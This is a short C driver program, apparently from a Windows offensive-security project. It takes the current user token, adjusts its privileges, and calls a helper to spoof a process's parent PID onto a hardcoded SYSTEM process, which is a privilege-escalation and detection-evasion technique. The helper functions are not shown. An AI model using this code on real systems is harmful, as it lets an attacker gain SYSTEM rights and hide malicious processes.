#include "PPID.h"

int main()
{

	DWORD PID = NULL;
	HANDLE hToken = NULL;

	if (!GetCurrentUserToken(&hToken))
	{
		PRINT_ERROR("GetCurrentUserToken");
		return 1;
	}

	if (!AdjustPrivileges(hToken))
	{
		PRINT_ERROR("AdjustPrivileges");
		return 1;
	}

	PID = 856;

	if (!PPIDSpoofingWithSystem(PID))
	{
		PRINT_ERROR("PPIDSpoofingWithSystem");
		return 1;
	}

	CHAR("Quit...");
	getchar();

	return 0;

}